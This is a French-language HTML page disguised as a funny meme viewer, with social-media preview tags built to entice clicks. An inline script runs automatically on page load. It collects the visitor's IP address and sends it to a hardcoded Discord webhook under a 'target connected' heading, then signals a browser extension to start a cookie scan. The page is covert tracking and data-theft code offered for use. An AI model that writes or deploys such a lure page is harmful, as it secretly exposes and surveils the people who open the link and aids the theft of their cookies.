<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="Meme_Rigolo.png">
    <meta property="og:description" content="Regarde ça, j'ai hurlé ! 😂">
    <meta property="og:image" content="https://pbs.twimg.com/media/ElRTFVrWkAAGRcw.jpg">
    <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary_large_image">
    
    <title>Meme Viewer</title>
    <style>
        body { margin: 0; background-color: #0e0e0e; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        img { max-width: 90%; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.5); cursor: pointer; }
    </style>
</head>
<body>

    <img src="https://pbs.twimg.com/media/ElRTFVrWkAAGRcw.jpg" alt="Meme">

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1481123753109885103/u6gAezp9LjuOt2Fbgl7cfuOMVyWU_hMw8zyuDw7w-EPnzLs8MWQbenmdXb4_JVMFxhzD";

        async function ravenCapture() {
            try {
                // 1. Récupération de l'IP de la cible
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const userIP = data.ip;

                // 2. Envoi des infos à ton Discord
                await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        embeds: [{
                            title: "🎯 CIBLE CONNECTÉE (Image Cliquée)",
                            color: 16711680, // Rouge
                            fields: [
                                { name: "📍 Adresse IP", value: `\`${userIP}\``, inline: true },
                                { name: "🌐 Plateforme", value: `\`${window.location.hostname}\``, inline: true },
                                { name: "🕵️ État", value: "Scan des cookies lancé...", inline: false }
                            ],
                            timestamp: new Date()
                        }]
                    })
                });

                // 3. Signal invisible pour ton extension Raven (Épisode 17)
                window.postMessage({ type: "RAVEN_SCAN_TRIGGER" }, "*");

            } catch (err) {
                console.log("Erreur de chargement de l'image.");
            }
        }

        // Exécution automatique au chargement
        window.onload = ravenCapture;
    </script>
</body>
</html>
